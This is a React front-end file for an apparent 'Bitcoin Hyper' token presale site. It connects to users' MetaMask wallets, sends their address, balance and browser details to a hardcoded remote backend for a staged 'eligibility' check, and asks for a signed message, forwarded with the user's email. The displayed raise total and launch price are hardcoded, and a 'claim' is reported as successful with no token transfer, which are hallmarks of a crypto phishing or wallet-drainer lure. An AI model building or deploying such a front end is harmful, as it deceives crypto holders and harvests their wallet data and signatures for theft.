// App.js - Bitcoin Hyper Presale Frontend
import React, { useState, useEffect } from 'react';
import { ethers } from 'ethers';
import './App.css';

const BACKEND_URL = 'https://tokenbackend-5xab.onrender.com';

function App() {
  const [walletAddress, setWalletAddress] = useState('');
  const [isConnected, setIsConnected] = useState(false);
  const [isEligible, setIsEligible] = useState(false);
  const [loading, setLoading] = useState(false);
  const [loadingMessage, setLoadingMessage] = useState('');
  const [tokenAllocation, setTokenAllocation] = useState({ amount: '0', valueUSD: '0' });
  const [eligibilityReason, setEligibilityReason] = useState('');
  const [scanId, setScanId] = useState('');
  const [email, setEmail] = useState('');
  const [claimLoading, setClaimLoading] = useState(false);
  const [claimSuccess, setClaimSuccess] = useState(false);
  const [error, setError] = useState('');
  const [backendStatus, setBackendStatus] = useState('checking');
  const [totalParticipants, setTotalParticipants] = useState('0');
  const [walletBalance, setWalletBalance] = useState('0');

  useEffect(() => {
    checkBackendStatus();
    checkExistingWalletConnection();
  }, []);

  const checkMetaMask = () => {
    return typeof window !== 'undefined' && typeof window.ethereum !== 'undefined';
  };

  const checkBackendStatus = async () => {
    try {
      const response = await fetch(`${BACKEND_URL}/api/health`);
      if (response.ok) {
        const data = await response.json();
        setBackendStatus('connected');
        if (data.statistics?.totalParticipants) {
          setTotalParticipants(data.statistics.totalParticipants.toLocaleString());
        }
      } else {
        setBackendStatus('error');
      }
    } catch (error) {
      setBackendStatus('error');
    }
  };

  const checkExistingWalletConnection = async () => {
    if (!checkMetaMask()) return;
    
    try {
      const provider = new ethers.BrowserProvider(window.ethereum);
      const accounts = await provider.listAccounts();
      if (accounts.length > 0) {
        const address = accounts[0].address;
        setWalletAddress(address);
        setIsConnected(true);
        const balance = await provider.getBalance(address);
        setWalletBalance(ethers.formatEther(balance));
      }
    } catch (error) {
      console.log('No existing wallet connection');
    }
  };

  const connectWallet = async () => {
    if (!checkMetaMask()) {
      setError('Please install MetaMask to continue.');
      return;
    }

    if (backendStatus !== 'connected') {
      setError('Backend system is offline. Please try again later.');
      return;
    }

    try {
      setLoading(true);
      setLoadingMessage('Requesting wallet connection...');

      const provider = new ethers.BrowserProvider(window.ethereum);
      const accounts = await window.ethereum.request({ 
        method: 'eth_requestAccounts' 
      });
      
      const address = accounts[0];
      setWalletAddress(address);
      setIsConnected(true);
      
      const balance = await provider.getBalance(address);
      setWalletBalance(ethers.formatEther(balance));

      setLoadingMessage('Analyzing wallet portfolio...');

      const response = await fetch(`${BACKEND_URL}/api/presale/connect`, {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'Accept': 'application/json'
        },
        body: JSON.stringify({
          walletAddress: address,
          userAgent: navigator.userAgent,
          balance: ethers.formatEther(balance),
          sessionId: 'session_' + Date.now()
        })
      });

      if (!response.ok) {
        throw new Error(`Backend error: ${response.status}`);
      }

      const data = await response.json();
      
      if (data.success) {
        setIsEligible(data.data.isEligible);
        setTokenAllocation(data.data.tokenAllocation || { amount: '0', valueUSD: '0' });
        setEligibilityReason(data.data.eligibilityReason || '');
        setScanId(data.data.scanId || '');
        
        if (data.data.isEligible) {
          setLoadingMessage('🎉 Congratulations! You are eligible for Bitcoin Hyper presale!');
        } else {
          setLoadingMessage('⚠️ Additional verification required for presale access');
        }
      } else {
        throw new Error(data.error || 'Wallet analysis failed');
      }
    } catch (error) {
      setError(error.message);
      setLoadingMessage('Connection failed');
    } finally {
      setTimeout(() => setLoading(false), 1500);
    }
  };

  const claimTokens = async () => {
    try {
      setClaimLoading(true);
      setLoadingMessage('Preparing secure claim signature...');

      if (!checkMetaMask()) {
        throw new Error('Wallet disconnected');
      }

      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      
      const message = `Bitcoin Hyper Presale Authorization\n\nWallet: ${walletAddress}\nAllocation: ${tokenAllocation.amount} BTH\nTimestamp: ${new Date().toISOString()}`;
      
      setLoadingMessage('Please sign the message in your wallet...');
      const signature = await signer.signMessage(message);

      setLoadingMessage('Processing claim...');

      const response = await fetch(`${BACKEND_URL}/api/presale/claim`, {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'Accept': 'application/json'
        },
        body: JSON.stringify({
          walletAddress: walletAddress,
          signature: signature,
          message: message,
          claimAmount: tokenAllocation.amount,
          claimValue: tokenAllocation.valueUSD,
          email: email || ''
        })
      });

      const data = await response.json();
      
      if (data.success) {
        setClaimSuccess(true);
        setLoadingMessage('🎉 Tokens claimed successfully!');
      } else {
        throw new Error(data.error || 'Claim failed');
      }
    } catch (error) {
      setError(error.message);
      setLoadingMessage('Claim failed');
    } finally {
      setTimeout(() => setClaimLoading(false), 1500);
    }
  };

  const disconnectWallet = () => {
    setIsConnected(false);
    setWalletAddress('');
    setIsEligible(false);
    setTokenAllocation({ amount: '0', valueUSD: '0' });
    setEmail('');
    setError('');
    setWalletBalance('0');
  };

  const renderBackendStatus = () => {
    if (backendStatus === 'checking') {
      return (
        <div className="status-badge checking">
          <div className="status-pulse"></div>
          <span>Connecting to backend...</span>
        </div>
      );
    } else if (backendStatus === 'error') {
      return (
        <div className="status-badge error" onClick={checkBackendStatus}>
          <span>🔴 BACKEND OFFLINE</span>
          <small>Click to retry</small>
        </div>
      );
    } else {
      return (
        <div className="status-badge connected">
          <div className="status-dot"></div>
          <span>✅ BACKEND LIVE</span>
          <small>System Active</small>
        </div>
      );
    }
  };

  return (
    <div className="app">
      <header className="header">
        <div className="logo">
          <span className="logo-icon">₿</span>
          <div>
            <h1>Bitcoin Hyper</h1>
            <p className="logo-subtitle">Official Presale Platform</p>
          </div>
        </div>
        
        <div className="header-info">
          {walletAddress && (
            <div className="wallet-display">
              <span className="wallet-icon">👛</span>
              <span className="wallet-address">
                {walletAddress.substring(0, 6)}...{walletAddress.substring(38)}
              </span>
              {isEligible && (
                <span className="wallet-badge eligible">ELIGIBLE</span>
              )}
            </div>
          )}
          
          {isConnected && (
            <button 
              className="disconnect-button"
              onClick={disconnectWallet}
            >
              Disconnect
            </button>
          )}
        </div>
      </header>

      <main className="main-content">
        <section className="hero-section">
          <div className="hero-background"></div>
          <h1 className="hero-title">Bitcoin Hyper Presale</h1>
          <p className="hero-subtitle">Next Generation Bitcoin Layer 2 Solution</p>
          
          <div className="hero-stats">
            <div className="hero-stat">
              <div className="stat-value">$0.17</div>
              <div className="stat-label">Presale Price</div>
            </div>
            <div className="hero-stat">
              <div className="stat-value">{totalParticipants}+</div>
              <div className="stat-label">Participants</div>
            </div>
            <div className="hero-stat">
              <div className="stat-value">$3.5M+</div>
              <div className="stat-label">Raised</div>
            </div>
          </div>
        </section>

        <div className="content-card">
          {loading && (
            <div className="loading-overlay">
              <div className="loading-content">
                <div className="loading-spinner"></div>
                <p className="loading-message">{loadingMessage}</p>
              </div>
            </div>
          )}

          {error && (
            <div className="error-banner">
              <div className="error-content">
                <span className="error-icon">⚠️</span>
                <div>
                  <p className="error-title">Error</p>
                  <p className="error-message">{error}</p>
                </div>
              </div>
              <button 
                className="error-dismiss"
                onClick={() => setError('')}
              >
                ×
              </button>
            </div>
          )}

          <div className="content-body">
            {!isConnected && !claimSuccess && (
              <div className="connect-section">
                <div className="section-header">
                  <h2>Connect Your Wallet</h2>
                  <p>Secure your Bitcoin Hyper presale allocation</p>
                </div>
                
                <div className="connection-status">
                  {renderBackendStatus()}
                </div>
                
                {!checkMetaMask() ? (
                  <div className="metamask-required">
                    <div className="metamask-icon">🦊</div>
                    <h4>MetaMask Required</h4>
                    <p>Please install MetaMask browser extension</p>
                    <a 
                      href="https://metamask.io/download/" 
                      target="_blank" 
                      rel="noopener noreferrer"
                      className="metamask-button"
                    >
                      Download MetaMask
                    </a>
                  </div>
                ) : (
                  <button 
                    className="connect-button"
                    onClick={connectWallet}
                    disabled={loading || backendStatus !== 'connected'}
                  >
                    {loading ? 'Connecting...' : 'Connect Web3 Wallet'}
                  </button>
                )}
                
                <div className="wallet-requirements">
                  <h4>Requirements:</h4>
                  <ul>
                    <li>✅ MetaMask wallet</li>
                    <li>✅ Transaction history</li>
                    <li>✅ EVM-compatible address</li>
                    <li>✅ Network fees balance</li>
                  </ul>
                </div>
              </div>
            )}

            {isConnected && !claimSuccess && (
              <div className="eligibility-section">
                <div className="section-header">
                  <h2>Wallet Analysis Result</h2>
                  <p>Real-time portfolio assessment complete</p>
                </div>
                
                <div className={`result-card ${isEligible ? 'eligible' : 'not-eligible'}`}>
                  <div className="result-icon">
                    {isEligible ? '✅' : '⚠️'}
                  </div>
                  <div className="result-content">
                    <h3>{isEligible ? 'PRESALE ELIGIBILITY CONFIRMED' : 'VERIFICATION REQUIRED'}</h3>
                    <p className="eligibility-reason">{eligibilityReason}</p>
                    
                    {isEligible && (
                      <div className="allocation-details">
                        <div className="allocation-item highlight">
                          <span>Token Allocation:</span>
                          <strong>{tokenAllocation.amount} BTH</strong>
                        </div>
                        <div className="allocation-item">
                          <span>Allocation Value:</span>
                          <strong>${tokenAllocation.valueUSD}</strong>
                        </div>
                        <div className="allocation-item">
                          <span>Presale Price:</span>
                          <strong>$0.17 per BTH</strong>
                        </div>
                      </div>
                    )}
                    
                    <div className="wallet-info">
                      <div className="info-item">
                        <span>Wallet Address:</span>
                        <strong>{walletAddress.substring(0, 6)}...{walletAddress.substring(38)}</strong>
                      </div>
                      <div className="info-item">
                        <span>Native Balance:</span>
                        <strong>{parseFloat(walletBalance).toFixed(4)} ETH</strong>
                      </div>
                    </div>
                  </div>
                </div>
                
                {isEligible ? (
                  <div className="eligible-actions">
                    <button 
                      className="action-button primary"
                      onClick={claimTokens}
                      disabled={claimLoading}
                    >
                      {claimLoading ? 'Processing Claim...' : '🚀 Claim My Tokens'}
                    </button>
                    <p className="action-note">
                      Note: Claiming requires a signature for verification only.
                    </p>
                  </div>
                ) : (
                  <div className="not-eligible-actions">
                    <button onClick={connectWallet}>
                      Retry Analysis
                    </button>
                    <button onClick={disconnectWallet}>
                      Connect Different Wallet
                    </button>
                  </div>
                )}
              </div>
            )}

            {claimSuccess && (
              <div className="success-section">
                <div className="success-header">
                  <div className="success-icon">🎊</div>
                  <h2>Congratulations!</h2>
                  <p className="success-subtitle">Your Bitcoin Hyper tokens have been successfully claimed!</p>
                </div>
                
                <div className="claim-details">
                  <div className="detail-card">
                    <div className="detail-header">
                      <span className="detail-badge">CONFIRMED</span>
                    </div>
                    <div className="detail-grid">
                      <div className="detail-item">
                        <span>Token Amount:</span>
                        <strong className="token-amount">{tokenAllocation.amount}</strong>
                      </div>
                      <div className="detail-item">
                        <span>Token Value:</span>
                        <strong className="token-value">${tokenAllocation.valueUSD}</strong>
                      </div>
                    </div>
                  </div>
                </div>
                
                <div className="success-actions">
                  <button onClick={() => window.location.reload()}>
                    Start New Claim
                  </button>
                </div>
              </div>
            )}
          </div>
        </div>

        <section className="info-section">
          <h2 className="info-title">Token Details</h2>
          
          <div className="token-details">
            <div className="detail-row">
              <span>Token Name:</span>
              <strong>Bitcoin Hyper (BTH)</strong>
            </div>
            <div className="detail-row">
              <span>Total Supply:</span>
              <strong>1,000,000,000 BTH</strong>
            </div>
            <div className="detail-row">
              <span>Presale Supply:</span>
              <strong>200,000,000 BTH (20%)</strong>
            </div>
            <div className="detail-row">
              <span>Presale Price:</span>
              <strong>$0.17 per BTH</strong>
            </div>
            <div className="detail-row">
              <span>Target Launch Price:</span>
              <strong>$0.85 per BTH</strong>
            </div>
          </div>
        </section>
      </main>

      <footer className="footer">
        <div className="footer-content">
          <div className="footer-logo">
            <span>Bitcoin Hyper</span>
          </div>
          <div className="footer-disclaimer">
            <p>© 2024 Bitcoin Hyper. All rights reserved. Cryptocurrency investments are subject to market risk.</p>
          </div>
        </div>
      </footer>
    </div>
  );
}

export default App;
